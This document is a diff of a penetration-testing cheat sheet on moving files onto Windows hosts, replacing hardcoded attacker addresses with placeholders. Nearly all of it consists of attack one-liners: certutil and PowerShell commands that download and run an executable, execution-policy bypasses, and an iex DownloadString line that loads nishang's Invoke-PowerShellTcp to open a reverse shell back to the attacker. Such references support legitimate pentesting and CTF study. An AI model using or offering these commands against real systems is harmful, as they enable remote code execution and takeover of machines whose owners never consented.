@@ -4,7 +4,6 @@ date: 2024-6-26
 tags: ["file transfer", "Windows", "evil-winrm"]
 ---
 
----
 {{< tab set1 tab1 active >}}CMD{{< /tab >}}
 {{< tab set1 tab2 >}}Powershell{{< /tab >}}
 {{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
@@ -14,8 +13,8 @@ tags: ["file transfer", "Windows", "evil-winrm"]
 
 <div>
 
-```bash
-python3 -m http.server 80
+```console
+python3 -m http.server <LOCAL_PORT>
 ```
 
 </div>
@@ -24,13 +23,13 @@ python3 -m http.server 80
 
 <div>
 
-```bash
-certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe
+```console
+certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE>
 ```
 
-```bash
+```console
 # Upload and Run
-certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe && C:\ProgramData\rev.exe
+certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE> && C:\ProgramData\<FILE>
 ```
 
 </div>
@@ -42,8 +41,8 @@ certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe &
 
 <div>
 
-```bash
-python3 -m http.server 80
+```console
+python3 -m http.server <LOCAL_PORT>
 ```
 
 </div>
@@ -52,14 +51,14 @@ python3 -m http.server 80
 
 <div>
 
-```powershell
+```console
 # Long version
-Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe
+Invoke-WebRequest http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -OutFile C:\ProgramData\<FILE>
 ```
 
-```powershell
+```console
 # Short version
-iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
+iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
 ```
 
 <small>*Note: PowerShell 3.0+*</small>
@@ -68,14 +67,14 @@ iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
 
 <div>
 
-```powershell
+```console
 # Long version
-powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
+powershell.exe -ExecutionPolicy bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
 ```
 
-```powershell
+```console
 # Short version
-powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
+powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
 ```
 
 <small>*Note: curl is not always available*</small>
@@ -84,23 +83,23 @@ powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
 
 <div>
 
-```powershell
+```console
 # Load into memory and Run
 ```
 
-```powershell
+```console
 # Long version
-Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT>
 ```
 
-```powershell
+```console
 # Short version
-iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
+iex (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT>
 ```
 
-```powershell
+```console
 # Combined version
-iex (iwr http://10.10.14.10/rev.ps1)
+iex (iwr http://<LOCAL_IP>:<LOCAL_PORT>/rev.ps1)
 ```
 
 <small>*Ref: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>
@@ -112,9 +111,9 @@ iex (iwr http://10.10.14.10/rev.ps1)
 
 <div>
 
-```bash
+```console
 # Evil-winrm built-in function
-upload "/tmp/example.txt" "C:\ProgramData\example.txt"
+upload '<LOCAL_FILE_PATH>' "C:\ProgramData\<FILE>"
 ```
 
 </div>
